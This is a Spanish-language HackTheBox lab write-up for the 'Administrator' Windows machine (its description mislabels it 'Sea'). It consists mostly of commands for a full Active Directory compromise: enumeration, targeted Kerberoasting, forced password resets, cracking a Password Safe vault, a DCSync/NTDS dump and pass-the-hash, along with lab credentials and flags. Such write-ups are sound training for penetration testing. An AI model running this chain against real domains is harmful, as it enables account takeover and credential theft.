---
title: "Administrator — HTB (Medium)"
date: 2026-05-18
tags:
  - hackthebox
  - windows
  - writeup
  - medium
draft: false
description: "Writeup de la máquina Sea de HackTheBox (Administrator, Windows)."
---

<div class="page">

![[Administrator-img/01.png]]

nmap -sS --min-rate 5000 -vvv --open -p- -n -Pn 10.129.52.90 -oG allports

extractPorts allports

nmap -sC -sV -vvv --open -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,51333,51338,51349,51360,53986 -n -Pn 10.129.52.90 -oN targeted

<span style="color:#3fbf4f;">\# Validar y agregar al /etc/hosts</span>

netexec smb 10.129.52.90

10.129.52.90 DC DC.administrator.htb administrator.htb

## INT ENUM

Username: Olivia Password: ichliebedich

ntpdate 10.129.52.90

netexec smb 10.129.52.90 -u olivia -p ichliebedich

netexec smb 10.129.52.90 -u olivia -p ichliebedich -k <span style="color:#f9ff23;">\# ok, primero sync al reloj del dc</span>

netexec smb dc.administrator.htb -u olivia -p ichliebedich -k --generate-krb5-file administrator-krb5.conf <span style="color:#f9ff23;">\# 2 veces si la primera falla</span>

cp administrator-krb5.conf /etc/krb5.conf <span style="color:#f9ff23;">\# funcional ntlm y kerberos en el caso de kerberos tenemos que ajusta el krb5.conf para que reconozca linux el kdc de windows</span>

netexec smb dc.administrator.htb -u guest -p '' --shares <span style="color:#3fbf4f;">\# esta deshabilitada</span>

netexec smb dc.administrator.htb -u olivia -p ichliebedich

netexec smb dc.administrator.htb -u olivia -p ichliebedich --shares -k <span style="color:#3fbf4f;">\# nada</span>

netexec smb dc.administrator.htb -u olivia -p ichliebedich --users <span style="color:#3fbf4f;">\# usuarios</span>

netexec winrm dc.administrator.htb -u olivia -p ichliebedich

netexec ldap dc.administrator.htb -u olivia -p ichliebedich

evil-winrm -i dc.administrator.htb -u olivia -p ichliebedich

### ldapdomaindump

ldapdomaindump -u 'administrator.htb\olivia' -p ichliebedich 10.129.52.90

python3 -m http.server 80

http://localhost/domain_users.html

### docker

apt install docker.io docker-compose

docker --version

docker-compose --version

systemctl status docker

systemctl stop docker

systemctl start docker

systemctl status

systemctl stop containerd

systemctl start

### bloodhound

wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz

tar -xvzf bloodhound-cli-linux-amd64.tar.gz

./bloodhound-cli install

./bloodhound-cli containers stop

./bloodhound-cli running

./bloodhound-cli containers start

http://127.0.0.1:8080/

user

pass

./bloodhound-cli resetpwd <span style="color:#3fbf4f;">\# en caso de que se olvide el pass</span>

docker ps

docker exec -it dvintage-graph-db-1 bash

cypher-shell -u neo4j -p bloodhoundcommunityedition <span style="color:#3fbf4f;">\# default viene con este pass</span>

http://127.0.0.1:7474/

user

pass

<span style="color:#f9ff23;">\# para recolectar los datos desde linux con el usuario que tenemos... si da error lo ejecutamos de nuevo, la primera da error a veces</span>

pipx install bloodhound-ce

ntpdate 10.129.52.90

bloodhound-ce-python -c all -d administrator.htb -u olivia -p ichliebedich -ns 10.129.52.90 --zip

<span style="color:#3fbf4f;">subir zip ir a explorar despues y poner a olivia como owned, nos vamos a cypher que es el que corre los queries</span>

![[Administrator-img/02.png]]

![[Administrator-img/03.png]]

<span style="color:#f9ff23;">\# Tiene el permiso GenericAll se le puede cambiar el pass o un targeted kerberoast, click a GenericAll y da las opciones</span>

### targetedKerberoast

https://github.com/ShutdownRepo/targetedKerberoast

wget https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/refs/heads/main/targetedKerberoast.py

python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'olivia' -p 'ichliebedich' \> algo <span style="color:#3fbf4f;">\# solo dio uno y es el que vemos </span>

kinit olivia

ichliebedich

klist

KRB5CCNAME=/tmp/krb5cc_0 python3 targetedKerberoast.py -d administrator.htb -k --no-pass --dc-host dc.administrator.htb \> algo <span style="color:#3fbf4f;">\# kerbebros</span>

hashcat algo /usr/share/wordlists/rockyou.txt <span style="color:#3fbf4f;">\# no encontro pass pero lo intententamos</span>

net rpc password "michael" "testtest" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.129.52.90 <span style="color:#f9ff23;">\# cambio de pass ok</span>

netexec smb 10.129.52.90 -u michael -p testtest -k

netexec winrm 10.129.52.90 -u michael -p 'testtest'

kinit michael

testtest

evil-winrm -i dc.administrator.htb -r administrator.htb <span style="color:#f9ff23;">\# donde -i es el host y -r es el dominio.. y tienes que tener el krb5.config ok y reloj sync ok</span>

evil-winrm -i dc.administrator.htb -u michael -p testtest

![[Administrator-img/04.png]]

net rpc password "benjamin" "testtest" -U "administrator.htb"/"michael"%"testtest" -S 10.129.52.90

netexec smb 10.129.52.90 -u benjamin -p testtest -k

netexec winrm 10.129.52.90 -u benjamin -p 'testtest' <span style="color:#f9ff23;">\# no tiene winrm</span>

netexec ftp 10.129.52.90 -u benjamin -p 'testtest' <span style="color:#f9ff23;">\# pero si tiene ftp</span>

### FTP

ftp 10.129.52.90

benjamin

testtest

get Backup.psafe3

file Backup.psafe3

### Password Safe gestor

https://github.com/pwsafe/pwsafe/releases?q=non-windows&expanded=true

### John

ls /usr/share/john \| grep 2john \| grep safe

find /usr/share/john/ -name '\*2john\*'

<span style="color:#3fbf4f;">pwsafe2john.py</span>

/usr/share/john/pwsafe2john.py Backup.psafe3 \> hash.txt

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

<span style="color:#3fbf4f;">tekieromucho</span>

### Hashcat

<span style="color:#f9ff23;">Identificar el tipo de hash o buscarlo en linea</span>

hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt

<span style="color:#3fbf4f;">Backup.psafe3:tekieromucho</span>

### Auth as emily

netexec smb dc.administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -k

netexec winrm dc.administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -k

evil-winrm -i dc.administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

user.txt

<span style="color:#ff0000;">\# 3a090995fe72addcf55490ff7f7b2b9c</span>

## GenericWrite

![[Administrator-img/05.png]]

python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' \> algo <span style="color:#3fbf4f;">\# solo dio uno y es el que vemos </span>

kinit emily

UXLCI5iETUsIBoFVTj8yQFKoHjXmb

klist

KRB5CCNAME=/tmp/krb5cc_0 python3 targetedKerberoast.py -d administrator.htb -k --no-pass --dc-host dc.administrator.htb \> algo<span style="color:#3fbf4f;">\# kerbebros</span>

hashcat algo /usr/share/wordlists/rockyou.txt

<span style="color:#ff0000;">limpbizkit</span>

## DCSYNC

<span style="color:#3fbf4f;">ethan tiene dcsync</span>

![[Administrator-img/06.png]]

kinit ethan

limpbizkit

klist

KRB5CCNAME=/tmp/krb5cc_0 netexec smb dc.administrator.htb -k --use-kcache --ntds --user administrator

KRB5CCNAME=/tmp/krb5cc_0 netexec smb dc.administrator.htb -k --use-kcache --ntds <span style="color:#3fbf4f;">\# o pones entre '' dependiendo el tipo de shell</span>

secretsdump.py ethan:limpbizkit@dc.administrator.htb

evil-winrm -i dc.administrator.htb -u administrator -H <span style="color:#ff0000;">3dc553ce4b9fd20bd016e098d2d2fd2e</span>

<span style="color:#3fbf4f;">whoami -- administrator\administrator</span>

root.txt

<span style="color:#ff0000;">\# 10afc6a6940c3b5030e4506de9594ee0</span>

## Check timedate

timedatectl set-ntp true

timedatectl show-timesync --all

timedatectl status

</div>
